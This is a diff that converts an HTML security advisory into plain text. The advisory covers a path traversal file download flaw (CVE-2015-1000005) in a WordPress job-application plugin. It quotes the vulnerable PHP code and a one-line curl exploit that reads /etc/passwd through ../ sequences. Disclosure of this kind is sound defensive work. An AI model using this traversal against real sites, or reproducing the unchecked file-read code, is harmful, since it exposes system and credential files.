@@ -1,41 +1,36 @@
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
-"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml">
-<head>
-<title></title>
-<meta name="generator" content="HTML::TextToHTML v2.51"/>
-</head>
-<body>
-<p>&lt;html&gt;&lt;title&gt;Vulnerability&lt;/title&gt;&lt;head&gt; &lt;style type="text/css"&gt;&lt;!-- A {text-decoration:none} --&gt;div {
-</p><p>    white-space: pre-wrap;      /* CSS3 <em>/
-    white-space: -moz-pre-wrap; /</em> Firefox <em>/
-    white-space: -pre-wrap;     /</em> Opera &lt;7 <em>/
-    white-space: -o-pre-wrap;   /</em> Opera 7 */
-    word-wrap: break-word;<br/>
-}&lt;/style&gt;&lt;/head&gt;&lt;body alink="<strong>EE0000" link="</strong>0000EE" bgcolor="#333333" text="#000000" vlink="#551A8B"&gt;&lt;center&gt;&lt;table border="0" cellpadding="2" cellspacing="2" width="70%"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style="background-color:rgb(150,200,200);font-weight: bold;"&gt;&lt;center&gt;Advisory #: 142&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Title:&lt;/b&gt; Remote file download vulnerability in candidate-application-form v1.0 wordpress plugin&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Author: &lt;/b&gt;Larry W. Cashdollar, @_larry0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Date:&lt;/b&gt; 2015-07-12&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Download Site:&lt;/b&gt; &lt;a href="<a href="https://wordpress.org/plugins/candidate-application-form">https://wordpress.org/plugins/candidate-application-form</a>"&gt;<a href="https://wordpress.org/plugins/candidate-application-form&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td">https://wordpress.org/plugins/candidate-application-form&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td</a> style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor: &lt;/b&gt;<a href="https://profiles.wordpress.org/flaxlandsconsulting/&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td">https://profiles.wordpress.org/flaxlandsconsulting/&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td</a> style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor Notified: &lt;/b&gt; 2015-07-12&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor Contact:&lt;/b&gt; &lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Description:&lt;/b&gt; &lt;span style="color: rgb(0, 0, 0); font-family: Times; font-size: medium; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: normal; orphans: auto; text-align: start; text-indent: 0px; text-transform: none; white-space: pre-wrap; widows: auto; word-spacing: 0px; -webkit-text-stroke-width: 0px; display: inline !important; float: none;"&gt;This plugin allows you to easily add a candidate application form to a job vacancy post, which allows the candidate to apply for the vacancy.&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vulnerability:&lt;/b&gt;&lt;div&gt;The code in downloadpdffile.php  doesn&amp;#039;t do any sanity checks, allowing a remote attacker to download sensitive system files:
-</p><p> &amp;lt;?php<br/>
-  2 $file_name = $_GET[&amp;quot;fileName&amp;quot;];
-  3 $path = $<u>GET[&amp;quot;fileUrl&amp;quot;];
-  4 $fullfile = $path.$file</u>name;<br/>
-  5 if (file_exists(&amp;#039;../../uploads/candidate_application_form/&amp;#039;.$file_name)) {
-</p><pre>
-  6     header(&amp;#039;Pragma: public&amp;#039;);   // required
-  7     header(&amp;#039;Expires: 0&amp;#039;);       // no cache
-  8     header(&amp;#039;Cache-Control: must-revalidate, post-check=0, pre-check=0&amp;#039;);
-  9     header(&amp;#039;Last-Modified: &amp;#039;.gmdate (&amp;#039;D, d M Y H:i:s&amp;#039;, filemtime (&amp;#039;../../uploads/candidate_application_form/&amp;#039;.$file_    name)).&amp;#039; GMT&amp;#039;);
- 10     header(&amp;#039;Cache-Control: private&amp;#039;,false);
- 11     header(&amp;#039;Content-Type: &amp;#039;.&amp;#039;application/pdf&amp;#039;);
- 12     header(&amp;#039;Content-Disposition: attachment; filename=&amp;quot;&amp;#039;.basename(&amp;#039;../../uploads/candidate_application_form/&amp;#039;.$file_    name).&amp;#039;&amp;quot;&amp;#039;);
- 13     header(&amp;#039;Content-Transfer-Encoding: binary&amp;#039;);
- 14     header(&amp;#039;Content-Length: &amp;#039;.filesize(&amp;#039;../../uploads/candidate_application_form/&amp;#039;.$file_name));    // provide file     size
- 15     header(&amp;#039;Connection: close&amp;#039;);
- 16     readfile(&amp;#039;../../uploads/candidate_application_form/&amp;#039;.$file_name);     // push it out
- 17     exit();
-</pre>
-<p> 18 }<br/>
-&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;CVE-2015-1000005&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;JSON:&lt;/b&gt;&lt;a href="json.php?s=142"&gt; Export&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Exploit Code:&lt;/b&gt;&lt;div&gt;&lt;pre class="php" style="font-family:monospace;"&gt;&lt;ol&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;$ curl http&lt;span style="color: #339933;"&gt;:&lt;/span&gt;&lt;span style="color: #666666; font-style: italic;"&gt;//<a href="http://www.example.com/wp-content/plugins/candidate-application-form/downloadpdffile.php?fileName=../../../../../../../../../../etc/passwd&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li">www.example.com/wp-content/plugins/candidate-application-form/downloadpdffile.php?fileName=../../../../../../../../../../etc/passwd&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li</a> style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&amp;nbsp;&lt;/div&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Screen Shots:&lt;/b&gt; &lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Advisory:&lt;/b&gt; &lt;a href="<a href="http://www.vapidlabs.com/advisory.php?v=142">http://www.vapidlabs.com/advisory.php?v=142</a>"&gt;<a href="http://www.vapidlabs.com/advisory.php?v=142&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/center&gt;&lt;/body&gt">http://www.vapidlabs.com/advisory.php?v=142&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/center&gt;&lt;/body&gt</a>;
-&lt;/html&gt;
-</p>
-
-</body>
-</html>
+                                Advisory #: 142
+Title: Remote file download vulnerability in candidate-application-form v1.0
+wordpress plugin
+Author:Larry W. Cashdollar, @_larry0
+Date: 2015-07-12
+Download Site: https://wordpress.org/plugins/candidate-application-form
+Vendor:https://profiles.wordpress.org/flaxlandsconsulting/
+Vendor Notified: 2015-07-12
+Vendor Contact:
+Description: This plugin allows you to easily add a candidate application form
+to a job vacancy post, which allows the candidate to apply for the vacancy.
+Vulnerability:
+The code in downloadpdffile.php doesn't do any sanity checks, allowing a remote
+attacker to download sensitive system files: <?php 2 $file_name = $_GET
+["fileName"]; 3 $path = $_GET["fileUrl"]; 4 $fullfile = $path.$file_name; 5 if
+(file_exists('../../uploads/candidate_application_form/'.$file_name)) { 6
+header('Pragma: public'); // required 7 header('Expires: 0'); // no cache 8
+header('Cache-Control: must-revalidate, post-check=0, pre-check=0'); 9 header
+('Last-Modified: '.gmdate ('D, d M Y H:i:s', filemtime ('../../uploads/
+candidate_application_form/'.$file_ name)).' GMT'); 10 header('Cache-Control:
+private',false); 11 header('Content-Type: '.'application/pdf'); 12 header
+('Content-Disposition: attachment; filename="'.basename('../../uploads/
+candidate_application_form/'.$file_ name).'"'); 13 header('Content-Transfer-
+Encoding: binary'); 14 header('Content-Length: '.filesize('../../uploads/
+candidate_application_form/'.$file_name)); // provide file size 15 header
+('Connection: close'); 16 readfile('../../uploads/candidate_application_form/
+'.$file_name); // push it out 17 exit(); 18 }
+CVE-2015-1000005
+JSON:Export
+Exploit Code:
+   1. $ curl http://www.example.com/wp-content/plugins/candidate-application-
+      form/downloadpdffile.php?fileName=../../../../../../../../../../etc/
+      passwd
+   2.  
+Screen Shots:
+Advisory: http://www.vapidlabs.com/advisory.php?v=142
